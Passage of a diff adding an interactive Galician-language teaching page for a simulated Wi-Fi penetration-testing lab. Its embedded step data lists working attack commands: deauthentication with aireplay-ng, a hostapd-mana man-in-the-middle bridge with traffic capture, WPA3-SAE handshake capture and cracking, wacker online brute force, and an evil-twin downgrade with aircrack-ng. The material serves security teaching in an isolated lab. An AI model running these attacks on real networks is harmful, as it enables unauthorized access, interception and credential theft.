wifi_cliente_wlan1 ping -c 3 192.168.50.1\n\nsudo grep -E 'ssid=|eap=|ca_cert=' /home/kali/wifiLab/run/eap_mitm/wpa_supplicant.conf\n\nsudo ip netns exec wifi_cliente_wlan1 ping -c 3 8.8.8.8"},{"name":"4. Arranque do punto de acceso intermedio - Consola 3","cmd":"# 4.1. Examinar a configuración de MANA\n\nsudo cat /home/kali/wifiLab/run/eap_mitm/mana.conf\n\n# 4.2. Iniciar `hostapd-mana`\n\nsudo wifilabctl mana-start\nsudo tail -f /home/kali/wifiLab/run/eap_mitm/mana-ap.log\n\nsudo ip netns exec mitm_wlan2 iw dev wlan2 info"},{"name":"5. Crear e validar a ponte - Consola 4","cmd":"sudo wifilabctl bridge-mitm\nsudo ip netns exec mitm_wlan2 ip -4 addr show dev br-mitm\nsudo ip netns exec mitm_wlan2 bridge link show\nsudo ip netns exec mitm_wlan2 ip route\nsudo ip netns exec mitm_wlan2 ping -c 3 192.168.50.1"},{"name":"6. Observación do AP lexítimo e do AP falso - Consola 5","cmd":"sudo iw dev wlan3 info\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\n# 6.1. Observación da desautenticación (páxinas 16–17 do PDF)\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\nsudo ip netns exec wifi_cliente_wlan1 cat /sys/class/net/wlan1/address\n\nsudo iw dev wlan3mon set channel 6\nsudo aireplay-ng --deauth 3 -a \u003cBSSID_AP_LEXITIMO\u003e -c \u003cMAC_CLIENTE\u003e wlan3mon\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\n\n# 6.2. Fixar e comprobar a asociación ao AP MANA\n\nsudo wifilabctl select-mitm\n\nsudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\nsudo ip netns exec wifi_cliente_wlan1 wpa_cli -i wlan1 status"},{"name":"7. Verificación de EAP/PEAP e do tráfico","cmd":"sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link\nsudo ip netns exec wifi_cliente_wlan1 wpa_cli -i wlan1 status\nsudo ip netns exec wifi_cliente_wlan1 ip -4 addr show dev wlan1\nsudo ip netns exec wifi_cliente_wlan1 ping -c 3 192.168.50.1\n\nsudo wifilabctl verify-mitm\n\n# 7.1. Observar HTTP en claro atravesando `br-mitm` — Consola 6\n\nsudo ip netns exec mitm_wlan2 tcpdump -ni br-mitm -A 'tcp port 8080'\n\nsudo ip netns exec wifi_cliente_wlan1 curl http://192.168.50.1:8080/\nsudo ip netns exec wifi_cliente_wlan1 curl -G \\\n  --data-urlencode 'usuario=proba' \\\n  --data-urlencode 'valor=docente' \\\n  http://192.168.50.1:8080/\n\nsudo ip netns exec mitm_wlan2 tcpdump -ni br-mitm -s 0 \\\n  -w /tmp/http-mitm.pcap 'tcp port 8080'"},{"name":"9. Limpeza do escenario","cmd":"sudo wifilabctl reset"}],"source":"2.3-ATAQUE_WPA2_EAP_MITM.md","wifite":null},"3.1":{"terms":[{"name":"3. Preparación do escenario - Terminal 1 (PDF: Consola 1, páxinas 5–7)","cmd":"sudo wifilabctl up wpa3_sae\nsudo wifilabctl status\n\nsudo ip netns exec phy0_wlan0 iw dev wlan0 info\nsudo tail -n 25 /home/kali/wifiLab/run/wpa3_sae/hostapd.log"},{"name":"4. Captura SAE e auditoría - Terminais 2 e 3","cmd":"# 4.1. Preparar a terminal 3 do atacante (PDF: Consola 3, páxinas 7–8)\n\niw dev\nsudo airmon-ng start wlan2\niw dev\n\n# 4.2. Recoñecer a rede (PDF: Consola 3, páxina 8)\n\nsudo airodump-ng wlan2mon\n\n# 4.3. Iniciar a captura de SAE (PDF: Consola 3, páxina 8)\n\nmkdir -p capturas\nsudo airodump-ng wlan2mon -c 6 -w capturas/cap\n\n# 4.4. Comprobar a conexión inicial — Terminal 2 (PDF: Consola 2, páxina 7)\n\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\n\n# 4.5. Reconectar o cliente sen pechar a terminal (PDF: Consola 2, páxina 8)\n\n# Desconectar o cliente xa xestionado por wpa_supplicant\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect\n\n# Limpar a caché PMKSA para provocar unha nova autenticación SAE\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush\nsleep 2\n\n# Conectar de novo e comprobar a asociación\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect\nsleep 8\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\n\nsudo tail -n 35 /home/kali/wifiLab/run/wpa3_sae/hostapd.log\n\n# 4.6. Auditar a captura — Terminal 3 (PDF: Consola 3, páxina 8)\n\n# Seleccionar o ficheiro de captura máis recente\nCAP=$(ls -t capturas/cap-*.cap | head -n 1)\necho \"$CAP\"\n\n# Rockyou pode estar xa descomprimido na VM\nif [ -f /usr/share/wordlists/rockyou.txt ]; then\n    WORDLIST=/usr/share/wordlists/rockyou.txt\nelse\n    gzip -cd /usr/share/wordlists/rockyou.txt.gz \u003e /tmp/rockyou.txt\n    WORDLIST=/tmp/rockyou.txt\nfi\n\nsudo aircrack-ng \"$CAP\" -w \"$WORDLIST\""},{"name":"6. Wacker: Ataque por Forza Bruta Online contra WPA3-SAE","cmd":"# 6.3. Instalación de wacker (Terminal 3; PDF: Consola 3, páxinas 9–10)\n\nsudo su -\n\n# Instalar dependencias de compilación\napt-get install -y pkg-config libnl-3-dev gcc libssl-dev libnl-genl-3-dev git\n\n# Clonar wacker\ncd /opt\ngit clone https://github.com/blunderbuss-wctf/wacker.git\ncd wacker\n\n# Aplicar o patch ao wpa_supplicant incluído no repositorio\ngit apply wpa_supplicant.patch\n\n# Compilar wpa_supplicant parcheado (pode tardar varios minutos)\ncp defconfig wpa_supplicant-2.10/wpa_supplicant/.config\ncd wpa_supplicant-2.10/wpa_supplicant\nmake -j4\n\n# Verificar compilación\nls -lh wpa_supplicant\n# -rwxr-xr-x 1 root root ~13M ... wpa_supplicant\n\n# 6.4. Identificar o obxectivo (Terminal 3; PDF: Consola 3, páxina 10)\n\n# Obter BSSID do AP lexítimo WPA3 (wlan0) e a súa frecuencia\nsudo ip netns exec phy0_wlan0 iw dev wlan0 info\n\n# Saída esperada:\n# Interface wlan0\n#   addr EA:18:30:AA:C3:48      ← BSSID_AP (anota este valor)\n#   ssid EMPRESA-XYZ\n#   channel 6 (2437 MHz)        ← FREQ = 2437\n\n# Gardar para uso posterior\nBSSID_AP=\"EA:18:30:AA:C3:48\"   # substituír polo BSSID real\nFREQ=2437\n\n# 6.5. Executar wacker (Terminal 4; PDF: Consola 4, páxina 10)\n\nsudo su -\ncd /opt/wacker\n\n# Asegurarse de que wlan2 NON está en modo monitor (parar airmon-ng se estivese activo)\nairmon-ng stop wlan2mon 2\u003e/dev/null || true\nip link set wlan2 down\niw dev wlan2 set type managed\nip link set wlan2 up\n\n# Descomprimir wordlist\ngunzip -kf /usr/share/wordlists/rockyou.txt.gz\n\n# Lanzar wacker (substituír BSSID_AP e FREQ polos valores reais)\npython3 wacker.py   --wordlist /usr/share/wordlists/rockyou.txt   --interface wlan2   --bssid EA:18:30:AA:C3:48   --ssid EMPRESA-XYZ   --freq 2437\n\n# Preparación da segunda radio e do dicionario — Terminal 3\n\nsudo wifilabctl status\niw dev\n\nsudo ip link set wlan3 down\nsudo iw dev wlan3 set type managed\nsudo ip link set wlan3 up\nsudo iw dev wlan3 info\n\nsudo split -n l/2 -d -a 1 \\\n  --additional-suffix=.txt \\\n  /usr/share/wordlists/rockyou.txt \\\n  /tmp/wifilab-wacker-parte-\n\nls -lh /tmp/wifilab-wacker-parte-{0,1}.txt\n\n# Primeiro atacante — Terminal 4 (`wlan2`)\n\ncd /opt/wacker\nBSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==\"addr\" {print $2; exit}')\necho \"AP WPA3-SAE: $BSSID_AP\"\nsudo python3 wacker.py \\\n  --wordlist /tmp/wifilab-wacker-parte-0.txt \\\n  --interface wlan2 \\\n  --bssid \"$BSSID_AP\" \\\n  --ssid EMPRESA-XYZ \\\n  --freq 2437\n\n# Segundo atacante — Terminal 3 (`wlan3`)\n\ncd /opt/wacker\nBSSID_AP=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==\"addr\" {print $2; exit}')\necho \"AP WPA3-SAE: $BSSID_AP\"\nsudo python3 wacker.py \\\n  --wordlist /tmp/wifilab-wacker-parte-1.txt \\\n  --interface wlan3 \\\n  --bssid \"$BSSID_AP\" \\\n  --ssid EMPRESA-XYZ \\\n  --freq 2437\n\n    sudo tee /usr/local/bin/wacker \u003e/dev/null \u003c\u003c'WSCRIPT'\n    #!/usr/bin/env bash\n    cd /opt/wacker\n    exec python3 ./wacker.py \"$@\"\n    WSCRIPT\n    sudo chmod 755 /usr/local/bin/wacker\n\n    sudo wacker --wordlist /tmp/wifilab-wacker-parte-0.txt --interface wlan2 --bssid \"$BSSID_AP\" --ssid EMPRESA-XYZ --freq 2437\n    sudo wacker --wordlist /tmp/wifilab-wacker-parte-1.txt --interface wlan3 --bssid \"$BSSID_AP\" --ssid EMPRESA-XYZ --freq 2437\n\n# 6.7. Monitorización e reanudación\n\n# Listar ficheiros de log (Terminal 4 despois da execución de Wacker)\nls -lh /tmp/wacker/\n# wlan2             → socket de control wpa_supplicant\n# wlan2.conf        → configuración wpa_supplicant para wacker\n# wlan2.pid         → PID do proceso wpa_supplicant\n# wlan2_wacker.log  → log detallado (só con --debug)\n\n# Reanudar desde unha palabra concreta (se o ataque foi interrompido)\npython3 wacker.py   --wordlist /usr/share/wordlists/rockyou.txt   --interface wlan2   --bssid EA:18:30:AA:C3:48   --ssid EMPRESA-XYZ   --freq 2437   --start sponge\n# Continúa desde a primeira palabra que comeza por \"sponge\""},{"name":"7. Limpeza","cmd":"sudo wifilabctl reset"}],"source":"3.1-ATAQUE_WPA3_SAE.md","wifite":"wifite-3.1-ATAQUE_WPA3-SAE.md"},"3.2":{"terms":[{"name":"4. Preparación desde cero","cmd":"# 4.1. Terminal 1 — Arrancar o escenario\n\nsudo wifilabctl up wpa3_sae\nsudo wifilabctl status\n\nip -br link\nsudo ip netns exec phy0_wlan0 iw dev wlan0 info\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\n\n# 4.2. Terminal 1 — Verificar a configuración WPA3-SAE e PMF\n\nsudo grep -E '^(ssid|channel|wpa_key_mgmt|ieee80211w|rsn_pairwise|sae_require_mfp)=' \\\n  /home/kali/wifiLab/run/wpa3_sae/hostapd.conf\n\nhostapd -v\nwpa_supplicant -v\nuname -r\ndpkg-query -W hostapd wpasupplicant\n\n# 4.3. Terminal 2 — Comprobar o cliente\n\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status"},{"name":"5. Captura da autenticación desde cero","cmd":"# 5.1. Terminal 3 — Elixir e comprobar a interface de captura\n\nip link show hwsim0\nsudo tshark -D\n\nsudo ip link set hwsim0 up\n\n    sudo airmon-ng start wlan3 6\n    iw dev\n\n# 5.2. Terminal 3 — Iniciar a captura\n\nsudo tshark -i hwsim0 \\\n  -a duration:90 \\\n  -w /tmp/krack-wpa3.pcapng\n\nsudo tshark -i wlan3mon \\\n  -a duration:90 \\\n  -w /tmp/krack-wpa3.pcapng\n\n# 5.3. Terminal 2 — Provocar unha nova autenticación\n\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 pmksa_flush\nsleep 2\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect\nsleep 8\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\n\n# 5.4. Terminal 1 — Verificar que o AP observou a conexión\n\nsudo tail -n 70 /home/kali/wifiLab/run/wpa3_sae/hostapd.log"},{"name":"6. Analizar a captura","cmd":"# 6.1. Comprobar que hai paquetes antes de filtrar\n\nls -lh /tmp/krack-wpa3.pcapng\nsudo capinfos /tmp/krack-wpa3.pcapng\nsudo tshark -r /tmp/krack-wpa3.pcapng -c 12\n\n# 6.2. Identificar tramas de autenticación e asociación Wi-Fi\n\nsudo tshark -r /tmp/krack-wpa3.pcapng \\\n  -Y 'wlan.fc.type_subtype == 0x000b || wlan.fc.type_subtype == 0x0000 || wlan.fc.type_subtype == 0x0001'\n\n# 6.3. Buscar EAPOL-Key do *4-Way Handshake*\n\nsudo tshark -r /tmp/krack-wpa3.pcapng -Y 'eapol'\n\nsudo tshark -r /tmp/krack-wpa3.pcapng \\\n  -Y 'eapol' \\\n  -T fields \\\n  -e frame.number \\\n  -e _ws.col.Info \\\n  -e eapol.keydes.replay_counter \\\n  -e wlan_rsna_eapol.keydes.msgnr \\\n  -e wlan.sa \\\n  -e wlan.da\n\nsudo tshark -r /tmp/krack-wpa3.pcapng \\\n  -Y 'frame.number == 282' -V\n\n# 6.4. Comprobar PMF en tramas de desautenticación\n\nsudo tshark -r /tmp/krack-wpa3.pcapng \\\n  -Y 'wlan.fc.type_subtype == 0x000c' \\\n  -T fields \\\n  -e frame.number \\\n  -e wlan.fc.protected \\\n  -e wlan.sa \\\n  -e wlan.da"},{"name":"7. Que facer se o filtro `eapol` non devolve nada?","cmd":"sudo tshark -r /tmp/krack-wpa3.pcapng \\\n  -T fields -e frame.protocols | sort | uniq -c | sort -nr | head -20"},{"name":"9. Finalización","cmd":"sudo cp /tmp/krack-wpa3.pcapng /home/kali/krack-wpa3.pcapng\nsudo chown kali:kali /home/kali/krack-wpa3.pcapng\n\nsudo wifilabctl reset"}],"source":"3.2-ATAQUE_WPA3_KRACK.md","wifite":"wifite-3.2-ATAQUE_WPA3_KRACK.md"},"3.3":{"terms":[{"name":"3. Terminal 1 - Arrancar e comprobar o escenario","cmd":"sudo wifilabctl up wpa3_sae_vulnerable\nsudo wifilabctl status\n\nsudo ip netns exec phy0_wlan0 iw dev wlan0 info\n\nLAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable\nsudo grep -E '^(ssid|channel|wpa|wpa_key_mgmt|ieee80211w|sae_require_mfp|wpa_passphrase|sae_password)=' \\\n  \"$LAB/hostapd.conf\""},{"name":"4. Terminal 2 - Comprobar a conexión inicial do cliente","cmd":"sudo ip netns exec phy1_wlan1 iw dev wlan1 link\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status\n\nsudo grep -E '(ssid=|key_mgmt=|ieee80211w=|sae_password=|psk=)' \\\n  /home/kali/wifiLab/run/wpa3_sae_vulnerable/wpa_supplicant.conf"},{"name":"5. Terminal 3 - Comprobar o Evil Twin","cmd":"sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info\n\nLAB=/home/kali/wifiLab/run/wpa3_sae_vulnerable\nsudo grep -E '^(ssid|channel|wpa_key_mgmt|wpa_passphrase|ieee80211w)=' \\\n  \"$LAB/hostapd_eviltwin.conf\"\n\nsudo grep -E 'AP-ENABLED|AP-DISABLED|failed|error' \\\n  \"$LAB/hostapd_eviltwin.log\" | tail -n 20\n\nAP_BSSID=$(sudo ip netns exec phy0_wlan0 iw dev wlan0 info | awk '$1==\"addr\" {print tolower($2); exit}')\nEVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==\"addr\" {print tolower($2); exit}')\necho \"AP lexítimo: $AP_BSSID\"\necho \"Evil Twin:   $EVIL_BSSID\""},{"name":"6. Terminal 4 - Identificar os dous AP mediante `hwsim0`","cmd":"ip link show hwsim0\nsudo ip link set dev hwsim0 up\nip link show hwsim0\n\nsudo tshark -i hwsim0 -a duration:15 \\\n  -Y 'wlan.fc.type_subtype == 8 \u0026\u0026 wlan.ssid == \"EMPRESA-XYZ\"' \\\n  -T fields -e wlan.bssid -e wlan.ssid | sort -u\n\n    sudo ip link set dev hwsim0 up\n    ip -br link show hwsim0\n\n    sudo tcpdump -i hwsim0 -c 10 -w /tmp/proba-hwsim0.pcap\n    sudo tshark -r /tmp/proba-hwsim0.pcap \\\n      -Y 'wlan.fc.type_subtype == 8' \\\n      -T fields -e wlan.bssid -e wlan.ssid | sort -u\n\nsudo tshark -i hwsim0 -a duration:10 -w /tmp/wpa3-3.3-beacons.pcapng\n\nsudo tshark -r /tmp/wpa3-3.3-beacons.pcapng \\\n  -Y 'wlan.fc.type_subtype == 8 \u0026\u0026 wlan.ssid == \"EMPRESA-XYZ\"' \\\n  -T fields -e frame.number -e wlan.bssid -e wlan.ssid"},{"name":"7. Terminal 4 - Iniciar a captura principal","cmd":"sudo tshark -i hwsim0 -w /tmp/wpa3-3.3-transicion.pcapng"},{"name":"8. Terminal 1 - Simular a caída do AP lexítimo","cmd":"sudo ip netns pids phy0_wlan0\n\nfor pid in $(sudo ip netns pids phy0_wlan0); do\n    printf 'PID=%s PROCESO=%s\\n' \"$pid\" \"$(cat /proc/\"$pid\"/comm 2\u003e/dev/null)\"\ndone\n\nfor pid in $(sudo ip netns pids phy0_wlan0); do\n    if [ \"$(cat /proc/\"$pid\"/comm 2\u003e/dev/null)\" = \"hostapd\" ]; then\n        echo \"Detendo AP lexítimo: PID=$pid\"\n        sudo kill -TERM \"$pid\"\n    fi\ndone\n\nsudo ip netns exec evil_twin_wlan2 iw dev wlan2 info\nsudo ip netns pids evil_twin_wlan2"},{"name":"9. Terminal 2 - Comprobar o intento de conexión ao Evil Twin","cmd":"sudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect\nsleep 10\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status\nsudo ip netns exec phy1_wlan1 iw dev wlan1 link\n\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 disconnect\nsleep 2\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 reconnect\nsleep 10\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status"},{"name":"10. Terminal 3 - Revisar os rexistros do Evil Twin","cmd":"sudo tail -n 100 \\\n  /home/kali/wifiLab/run/wpa3_sae_vulnerable/hostapd_eviltwin.log"},{"name":"11. Terminal 4 - Deter e analizar a captura","cmd":"sudo capinfos /tmp/wpa3-3.3-transicion.pcapng\n\nsudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \\\n  -Y 'eapol' -T fields \\\n  -e frame.number -e _ws.col.Info \\\n  -e wlan.bssid -e wlan.sa -e wlan.da \\\n  -e eapol.keydes.replay_counter \\\n  -e wlan_rsna_eapol.keydes.msgnr\n\nEVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==\"addr\" {print tolower($2); exit}')\n\necho \"Filtrando EAPOL do Evil Twin: $EVIL_BSSID\"\nsudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \\\n  -Y \"eapol \u0026\u0026 wlan.bssid == $EVIL_BSSID\" -T fields \\\n  -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da \\\n  -e eapol.keydes.replay_counter\n\nsudo tshark -r /tmp/wpa3-3.3-transicion.pcapng \\\n  -Y \"wlan.bssid == $EVIL_BSSID \u0026\u0026 (wlan.fc.type_subtype == 0x000b || wlan.fc.type_subtype == 0x0000 || eapol)\" \\\n  -T fields -e frame.number -e _ws.col.Info -e wlan.sa -e wlan.da"},{"name":"12. Terminal 4 - Auditoría do contrasinal WPA2-PSK con Aircrack-ng","cmd":"printf 'contraseña-de-proba\\nspongebob19\\nclave-incorrecta\\n' \u003e /tmp/wpa3-3.3-dicionario.txt\n\nEVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==\"addr\" {print tolower($2); exit}')\n\nsudo aircrack-ng -b \"$EVIL_BSSID\" \\\n  -w /tmp/wpa3-3.3-dicionario.txt \\\n  /tmp/wpa3-3.3-transicion.pcapng\n\nif [ -f /usr/share/wordlists/rockyou.txt ]; then\n    cp /usr/share/wordlists/rockyou.txt /tmp/rockyou-3.3.txt\nelif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then\n    gzip -dc /usr/share/wordlists/rockyou.txt.gz \u003e /tmp/rockyou-3.3.txt\nfi\n\n# Executar con rockyou cando o ficheiro estea dispoñible:\nEVIL_BSSID=$(sudo ip netns exec evil_twin_wlan2 iw dev wlan2 info | awk '$1==\"addr\" {print tolower($2); exit}')\nsudo aircrack-ng -b \"$EVIL_BSSID\" \\\n  -w /tmp/rockyou-3.3.txt \\\n  /tmp/wpa3-3.3-transicion.pcapng"},{"name":"13. Restaurar o laboratorio","cmd":"sudo wifilabctl up wpa3_sae_vulnerable\nsudo wifilabctl status\nsudo ip netns exec phy1_wlan1 wpa_cli -i wlan1 status"}],"source":"3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.md","wifite":"wifite-3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN.md"}};
+  // URLs do MkDocs publicado: guía completa de cada práctica.
+  var DOC_BASE="https://ricardofc.github.io/repoEDU-CCbySA/HE/Taller/Indice-Taller-HE-Practicas/site-HE-UD2/ud2/practicas-taller/vuln-wifi.lab/";
+  var DOC_SLUGS={
+    "1.1":"1.1-ATAQUE_WPA2_PSK",
+    "1.2":"1.2-ATAQUE_WPA2_PSK_DEAUTH",
+    "1.3":"1.3-ATAQUE_WPA2_PSK_PMF",
+    "1.4":"1.4-ATAQUE_WPA2_PSK_PMKID",
+    "2.1":"wifite-2.1-ATAQUE_WPA2_EAP",
+    "2.2":"2.2-ATAQUE_WPA2_EAP_EVIL_TWIN",
+    "2.3":"2.3-ATAQUE_WPA2_EAP_MITM",
+    "3.1":"3.1-ATAQUE_WPA3_SAE",
+    "3.2":"3.2-ATAQUE_WPA3_KRACK",
+    "3.3":"3.3-ATAQUE_WPA3_DoS_WPA2_EVIL_TWIN"
+  };
+
+  PRACS.forEach(function(p){
+    var source=VALIDATED_STEPS[p.id];
+    if(!source)return;
+    p.terms=source.terms;
+    p.docUrl=DOC_BASE+DOC_SLUGS[p.id]+"/";
+  });
+
+  var curId="1.1", curTerm=0, checks={};
+  var grid=document.getElementById("pracGrid"), shell=document.getElementById("labShell");
+
+  function renderGrid(){
+    grid.innerHTML="";
+    PRACS.forEach(function(p){
+      var b=document.createElement("button");
+      b.className="pbtn"; b.type="button";
+      b.setAttribute("data-on", p.id===curId?1:0);
+      b.innerHTML='<span class="pid">Práctica '+p.id+'</span><span class="pt">'+p.title+'</span><span class="ps">'+p.sc+'</span>';
+      b.addEventListener("click",function(){ curId=p.id; curTerm=0; renderGrid(); renderLab(); });
+      grid.appendChild(b);
+    });
+  }
+
+  function renderLab(){
+    var p=PRACS.find(function(x){return x.id===curId;})||PRACS[0];
+    var html='<div class="lab-head"><h2>Práctica '+p.id+' — '+p.title+'</h2>'+
+      '<div class="lab-badges"><span class="lbadge sc">Escenario: <code>'+p.sc+'</code></span><span class="lbadge">'+p.pdf+'</span><span class="lbadge">'+p.status+'</span></div></div>';
+
+    // Referencia docente validada en MkDocs: unha ligazón por práctica.
+    if(p.docUrl){
+      html+='<div class="source-guide">'+
+        '<strong>Guía docente de referencia:</strong> '+
+        '<a target="_blank" rel="noopener noreferrer" href="'+p.docUrl+'">Abrir procedemento completo</a>'+ 
+        '<p>Executa as etapas na orde indicada. As pestanas conteñen os bloques de comandos das guías, pero as explicacións, os resultados esperados e as advertencias están no documento completo. Os resumos da topoloxía son orientativos.</p></div>';
+    }
+    html+='<div class="lab-body"><div>';
+    html+='<div class="topo-box"><h3>Topoloxía de namespaces e interfaces</h3><div class="ns-list">';
+    p.nodes.forEach(function(n){
+      html+='<div class="ns-row"><b>'+n.r+'</b><span class="spacer"><code>'+n.ns+'</code> · <code>'+n.if+'</code></span></div>';
+    });
+    html+='</div></div>';
+
+    html+='<div class="wf-box '+p.wifite.cls+'"><b>Manual vs Wifite: '+p.wifite.title+'</b><p style="margin:6px 0 0;color:var(--muted)">'+p.wifite.text+'</p></div>';
+
+    html+='<div style="margin-top:14px"><b style="font-size:13px">Checklist de validación de evidencias:</b><div class="ev-list">';
+    p.ev.forEach(function(e,ei){
+      var key=p.id+"_"+ei, done=!!checks[key];
+      html+='<label class="ev-item'+(done?' done':'')+'"><input type="checkbox" data-ev="'+key+'"'+(done?' checked':'')+'><span>'+e+'</span></label>';
+    });
+    html+='</div></div></div>';
+
+    html+='<div><div class="term-tabs">';
+    p.terms.forEach(function(t,ti){
+      html+='<button class="ttab" type="button" data-ti="'+ti+'" data-on="'+(ti===curTerm?1:0)+'">'+t.name+'</button>';
+    });
+    html+='</div>';
+    var activeTerm=p.terms[curTerm]||p.terms[0];
+    html+='<div class="codeblock"><button class="copy-btn" type="button">Copiar</button>'+activeTerm.cmd.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")+'</div>';
+    html+='<p style="font-size:12.5px;color:var(--muted);margin-top:10px">⚠️ Substitúe os identificadores ilustrativos (BSSID_AP, MAC_CLIENTE e outros) polos valores reais da túa sesión. Le primeiro as indicacións da guía completa; algúns bloques conteñen saídas de exemplo.</p>';
+    html+='</div></div>';
+
+    shell.innerHTML=html;
+
+    shell.querySelectorAll(".ttab").forEach(function(b){
+      b.addEventListener("click",function(){ curTerm=Number(b.getAttribute("data-ti")); renderLab(); });
+    });
+    shell.querySelectorAll("input[data-ev]").forEach(function(chk){
+      chk.addEventListener("change",function(){ checks[chk.getAttribute("data-ev")]=chk.checked; renderLab(); });
+    });
+  }
+
+  renderGrid();
+  renderLab();
+})();
+</script>
+</body>
+</html>
